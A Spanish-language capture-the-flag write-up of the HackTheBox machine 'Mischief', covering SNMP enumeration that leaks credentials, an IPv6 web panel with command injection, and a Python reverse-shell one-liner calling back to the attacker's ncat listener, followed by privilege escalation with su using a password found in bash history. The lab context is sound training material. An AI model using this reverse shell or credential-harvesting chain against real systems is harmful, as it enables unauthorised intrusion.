---
layout: single
title: Mischeif HackTheBox
date: 2023-11-10
classes: wide
header:
  teaser: /assets/images/htb-writeup-Mischief/icono.jpg
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - pentesting
tags:
  - Hacking Web
  - Ipv6
  - Command Execution
---
Buenas a todos, en esta ocasión resolveremos una máquina Linux llamada "Mischief" la cual está catalogada como insane en la plataforma de HackTheBox. 

![](/assets/images/htb-writeup-Mischief/mischief.png)

---

Primero empezamos a escanear con Nmap para ver que puertos tiene abiertos.

```bash

❯ nmap -sS -Pn -vvv --min-rate 5000 --open -p- -n 10.10.10.92 -oG allports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-10 20:31 GMT
Initiating SYN Stealth Scan at 20:31
Scanning 10.10.10.92 [65535 ports]
Discovered open port 22/tcp on 10.10.10.92
Stats: 0:00:15 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 57.46% done; ETC: 20:31 (0:00:12 remaining)
Discovered open port 3366/tcp on 10.10.10.92
Completed SYN Stealth Scan at 20:31, 26.54s elapsed (65535 total ports)
Nmap scan report for 10.10.10.92
Host is up, received user-set (0.25s latency).
Scanned at 2023-11-10 20:31:19 GMT for 27s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE        REASON
22/tcp   open  ssh            syn-ack ttl 63
3366/tcp open  creativepartnr syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.65 seconds
           Raw packets sent: 131085 (5.768MB) | Rcvd: 19 (836B)

```
Sigamos con el escaneo de puertos.

```bash

❯ nmap -sCV -p22,3366 10.10.10.92 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-10 20:35 GMT
Nmap scan report for 10.10.10.92
Host is up (0.25s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2a:90:a6:b1:e6:33:85:07:15:b2:ee:a7:b9:46:77:52 (RSA)
|   256 d0:d7:00:7c:3b:b0:a6:32:b2:29:17:8d:69:a6:84:3f (ECDSA)
|_  256 3f:1c:77:93:5c:c0:6c:ea:26:f4:bb:6c:59:e9:7c:b0 (ED25519)
3366/tcp open  caldav  Radicale calendar and contacts server (Python BaseHTTPServer)
|_http-server-header: SimpleHTTP/0.6 Python/2.7.15rc1
| http-auth: 
| HTTP/1.0 401 Unauthorized\x0D
|_  Basic realm=Test
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.85 seconds
```
Si miramos bien, en el puerto 3366 nos llevará a una página que nos pedirá unas credenciales:

![](/assets/images/htb-writeup-Mischief/puerto3366.jpg)

Si lanzamos un curl podemos ver que en la web corre un SimpleHTTPServer usando la versión de Python 2.7.15rc1

```bash

❯ curl -s -X GET "http://10.10.10.92:3366" -I
HTTP/1.0 401 Unauthorized
Server: SimpleHTTP/0.6 Python/2.7.15rc1
Date: Fri, 10 Nov 2023 20:49:20 GMT
WWW-Authenticate: Basic realm="Test"
Content-type: text/html

```
Otra forma de ver la versión del servidor es tirando del WhatWeb.

```bash

❯ whatweb http://10.10.10.92:3366
http://10.10.10.92:3366 [401 Unauthorized] Country[RESERVED][ZZ], HTTPServer[SimpleHTTP/0.6 Python/2.7.15rc1], IP[10.10.10.92], Python[2.7.15rc1], WWW-Authenticate[Test][Basic]

```
Ya que no tenemos más puertos para enumerar lo que podemos hacer es lanzar un escaneo con Nmap por UDP.

```bash

❯ nmap -sU --top-ports 500 -v -n -Pn 10.10.10.92
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-10 20:55 GMT
Initiating UDP Scan at 20:55
Scanning 10.10.10.92 [500 ports]
UDP Scan Timing: About 31.00% done; ETC: 20:57 (0:01:09 remaining)
Discovered open port 161/udp on 10.10.10.92
Completed UDP Scan at 20:56, 45.77s elapsed (500 total ports)
Nmap scan report for 10.10.10.92
Host is up (0.26s latency).
Not shown: 499 open|filtered udp ports (no-response)
PORT    STATE SERVICE
161/udp open  snmp

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 45.84 seconds
           Raw packets sent: 1090 (54.446KB) | Rcvd: 11 (1.174KB)

```

Vemos que el puerto 161 corre un servicio bastante interesante y es el servicio snmp.

Podemos usar snmpwalk para tener más información de la máquina, pero antes de enumerar necesitamos saber la community string, para esto podemos usar la herramienta onesixtione.

```bash
❯ onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt 10.10.10.92
Scanning 1 hosts, 3218 communities
10.10.10.92 [public] Linux Mischief 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64
10.10.10.92 [public] Linux Mischief 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64
```
Tenemos la comunnity string y es public, ahora usemos snmpwalk para enumerar información del equipo.

Recordemos que podemos enumerar procesos, si volvemos a ver en el escaneo que hicimos con Nmap nos muestra que la web por el puerto 3366 corre por un servidor en Python.

```bash
❯ snmpwalk -v 2c -c public 10.10.10.92 hrSWRunName | grep python
HOST-RESOURCES-MIB::hrSWRunName.772 = STRING: "python"

```

Para tener más información de ese proceso que acabamos de encontrar debemos hacer un grep a "772".

```bash

❯ snmpwalk -v 2c -c public 10.10.10.92 hrSWRunTable | grep "772"
HOST-RESOURCES-MIB::hrSWRunIndex.772 = INTEGER: 772
HOST-RESOURCES-MIB::hrSWRunName.772 = STRING: "python"
HOST-RESOURCES-MIB::hrSWRunID.772 = OID: SNMPv2-SMI::zeroDotZero
HOST-RESOURCES-MIB::hrSWRunPath.772 = STRING: "python"
HOST-RESOURCES-MIB::hrSWRunParameters.772 = STRING: "-m SimpleHTTPAuthServer 3366 loki:godofmischiefisloki --dir /home/loki/hosted/" <--
HOST-RESOURCES-MIB::hrSWRunType.772 = INTEGER: application(4)
HOST-RESOURCES-MIB::hrSWRunStatus.772 = INTEGER: runnable(2)
```
Tenemos las credenciales de un usuario llamado Loki, intentemos usar esas credenciales para acceder a la web.

![](/assets/images/htb-writeup-Mischief/web.jpg)

Hay más credenciales, podemos guardarlas en un fichero .txt 

```bash

loki:godofmischiefisloki
loki:trickeryanddeceit

```
Con snmpwalk podemos usar el mib de ipAddressType para ver todas las interfaces de red de la máquina, incluyendo la Ipv6.

```bash

❯ snmpwalk -v2c -c public 10.10.10.92 ipAddressType
IP-MIB::ipAddressType.ipv4."10.10.10.92" = INTEGER: unicast(1)
IP-MIB::ipAddressType.ipv4."10.10.10.255" = INTEGER: broadcast(3)
IP-MIB::ipAddressType.ipv4."127.0.0.1" = INTEGER: unicast(1)
IP-MIB::ipAddressType.ipv6."00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:01" = INTEGER: unicast(1)
IP-MIB::ipAddressType.ipv6."de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:b9:e3:a2" = INTEGER: unicast(1)
IP-MIB::ipAddressType.ipv6."fe:80:00:00:00:00:00:00:02:50:56:ff:fe:b9:e3:a2" = INTEGER: unicast(1)
```
Ahora debemos quitar los ':' extras cada dos carácteres para obtener la dirección Ipv6 real.

Quedaría algo asi:

```

dead:beef::0250:56ff:feb9:e3a2

```
Recuerden que es opcional sacarles los ceros. 

Escaneamos esa dirección Ipv6 para ver si tiene algun puerto abierto.

```bash

❯ nmap -6  -Pn -n dead:beef::0250:56ff:feb9:e3a2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-10 22:13 GMT
Nmap scan report for dead:beef::250:56ff:feb9:e3a2
Host is up (0.26s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 3.20 seconds

```

Nos reportó que el puerto 80 está abierto, ahora debemos colocar la dirección Ipv6 en el /etc/host.

```
echo "dead:beef::0250:56ff:feb9:e3a2 mischief.htb" | sudo tee -a /etc/hosts  

```

Accedamos a la web.

![](/assets/images/htb-writeup-Mischief/login.jpg)

Si nos fijamos bien nos muestra un login.

Luego de varios intentos, pude acceder con estas credenciales:

```
username=Administrator
password=trickeryanddeceit

```
Una vez dentro vemos que podemos ejecutar comandos.

![](/assets/images/htb-writeup-Mischief/command.jpg)

---

## Shell como WWW-DATA

En el output al enviar un ';' nos muestra el comando ejecutado.

![](/assets/images/htb-writeup-Mischief/command2.jpg)

Al ejecutar un "whoami;" podemos ver al usuario "www-data"

Para ganar acceso como "www-data" yo voy a utilizar un script en Python, en el script tiene que cambiar AF_INET a AF_INET6 y en la dirección IP no tiene que poner la IPv4 tiene que poner su dirección IPv6
 
```python

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::1018",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

```

Nos ponemos en escucha por ncat.

```bash

❯ ncat -6lvnp 443 --listen dead:beef:2::1018
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [dead:beef:2::1018]:443

```
Ejecutemos el script en Python en la pagina web.

![](/assets/images/htb-writeup-Mischief/command3.jpg)

Regresemos al ncat y vemos que ganamos acceso.

```bash

❯ ncat -6lvnp 443 --listen dead:beef:2::1018
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [dead:beef:2::1018]:443
Ncat: Connection from [dead:beef::250:56ff:feb9:e3a2]:53256.
/bin/sh: 0: can't access tty; job control turned off
$ script /dev/null -c bash
Script started, file is /dev/null
www-data@Mischief:/var/www/html$ ifconfig
ifconfig
ens33: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.92  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 dead:beef::250:56ff:feb9:e3a2  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:e3a2  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:e3:a2  txqueuelen 1000  (Ethernet)
        RX packets 154210  bytes 9724905 (9.7 MB)
        RX errors 0  dropped 90  overruns 0  frame 0
        TX packets 15844  bytes 2464571 (2.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

www-data@Mischief:/var/www/html$
 
```
Ahora para movernos por la terminal más comodos hagamos un tratamiento de la TTY.

```
export TERM=xterm
export SHELL=bash

Ctrl + z

stty raw -echo; fg

reset xterm

```
Luego de un rato enumerando en el directorio /home/loki encontre un archivo llamado "credentials", que
dentro se encuentran las credenciales de Loki para poder conectarnos por ssh.

```
www-data@Mischief:/home/loki$ ls
credentials  hosted  user.txt
www-data@Mischief:/home/loki$ cat credentials 
pass: lokiisthebestnorsegod
www-data@Mischief:/home/loki$ 
```
Nos conectamos por ssh y una vez dentro ya podemos leer la primera flag. 

```
❯ sudo ssh loki@10.10.10.92
[sudo] password for void: 
loki@10.10.10.92's password: 
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Nov 10 23:26:18 UTC 2023

  System load:  0.0               Processes:            167
  Usage of /:   61.5% of 6.83GB   Users logged in:      0
  Memory usage: 36%               IP address for ens33: 10.10.10.92
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.


Last login: Sat Jul 14 12:44:04 2018 from 10.10.14.4
loki@Mischief:~$ ls
credentials  hosted  user.txt
loki@Mischief:~$ cat user.txt 
bf5***************************60
loki@Mischief:~$
 
```
---
## Escalada de privilegios

Listamos el "history" para ver que comandos ejecutó el usuario Loki.

```bash

loki@Mischief:~$ history
    1  python -m SimpleHTTPAuthServer loki:lokipasswordmischieftrickery <--
    2  exit
    3  free -mt
    4  ifconfig
    5  cd /etc/
    6  sudo su
    7  su
    8  exit
    9  su root
   10  ls -la
   11  sudo -l
   12  ifconfig
   13  id
   14  cat .bash_history 
   15  nano .bash_history 
   16  exit
   17  ls
   18  cat user.txt 
   19  sudo su
   20  sudo -l
   21  hostiry
   22  history
loki@Mischief:~$ 

```
Intentemos usar esas credenciales para convertirnos en Root.

```bash
loki@Mischief:~$ su
bash: /bin/su: Permission denied
loki@Mischief:~$ sudo su
bash: /usr/bin/sudo: Permission denied
loki@Mischief:~$ 

```
Vemos que no nos deja usar "SU" o "SUDO SU".

Para listar mejor los privilegios podemos usar getfacl.

```bash

loki@Mischief:~$ getfacl /bin/su 
getfacl: Removing leading '/' from absolute path names
# file: bin/su
# owner: root
# group: root
# flags: s--
user::rwx
user:loki:r--
group::r-x
mask::r-x
other::r-x

loki@Mischief:~$ getfacl /bin/su 
getfacl: Removing leading '/' from absolute path names
# file: bin/su
# owner: root
# group: root
# flags: s--
user::rwx
user:loki:r--
group::r-
mask::r-x
other::r-x
```
Pueden ver que en "user:loki:r--" tiene capacidad de lectura pero no de ejecución, aunque para otros
tienen capacidad lectura y de ejecución.

Volvamos a la shell "www-data" e intentemos escalar los privilegios ahí utilizando el comando "SU" y 
la contraseña "lokipasswordmischieftrickery".

```bash

www-data@Mischief:/$ su
Password: lokipasswordmischieftrickery
root@Mischief:/#

```
Pudimos escalar los privilegios, ahora nos dirigimos al directorio /root para visualizar la segunda flag.

```bash

root@Mischief:~# cat root.txt 
cat root.txt
The flag is not here, get a shell to find it!
root@Mischief:~# 
```
Pero vemos que nos dice que la falg no se encuentra ahí y que debemos encontrarla.

Busquemos archivos que llamen root.txt con find.

```bash

root@Mischief:/# find \-name root.txt 2>/dev/null
./usr/lib/gcc/x86_64-linux-gnu/7/root.txt
./root/root.txt
root@Mischief:/# 

```

Nos muestra una ruta donde podria estar la verdadera flag de root, veamos si se encuentra haciéndole un cat a la ruta del archivo.

```bash

root@Mischief:/# cat ./usr/lib/gcc/x86_64-linux-gnu/7/root.txt
ae155fad479c56f912c65d7be4487807
root@Mischief:/# 
```
Tenemos la segunda flag.

Espero que se haya entendido.

Gracias por leer :)
